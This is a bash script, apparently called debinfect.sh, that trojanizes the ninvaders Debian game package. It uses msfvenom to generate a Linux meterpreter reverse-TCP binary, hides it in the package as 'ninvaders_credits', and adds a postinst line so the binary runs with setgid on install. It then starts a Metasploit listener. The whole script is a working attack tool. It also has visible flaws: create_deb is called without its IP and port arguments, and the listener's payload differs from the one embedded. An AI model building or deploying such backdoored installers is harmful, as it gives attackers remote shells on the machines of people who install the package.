#!/bin/bash

source restart_env.sh

sleep 2
function create_deb() {
    mkdir /tmp/packing
    dpkg -x ninvaders_0.1.1-3+b3_amd64.deb /tmp/packing/work
    mkdir /tmp/packing/work/DEBIAN
    ar -x ninvaders_0.1.1-3+b3_amd64.deb

    tar -xf control.tar.xz ./control
    tar -xf control.tar.xz ./postinst

    mv control /tmp/packing/work/DEBIAN/
    mv postinst /tmp/packing/work/DEBIAN/

    sudo msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 -f elf -o ninvaders_credits
    mv ninvaders_credits /tmp/packing/work/usr/games/
    echo "sudo chmod 2755 /usr/games/ninvaders_credits && /usr/games/ninvaders_credits &" >>/tmp/packing/work/DEBIAN/postinst
    dpkg-deb --build /tmp/packing/work/
    mv /tmp/packing/work.deb /tmp/packing/ninvaders.deb
    cp -n /tmp/packing/ninvaders.deb $(pwd)
}

if [ "$#" != 2 ]; then
    echo -e "Invalid args\n./debinfect.sh <IP> <PORT>"
else
    $(pwd)/input_validator.sh "$1" "$2"
    create_deb
    sudo service postgresql start
    msfconsole -q -x "use exploit/multi/handler;set PAYLOAD linux/x64/shell/reverse_tcp; set LHOST $1; set LPORT $2; run; exit -y"
fi
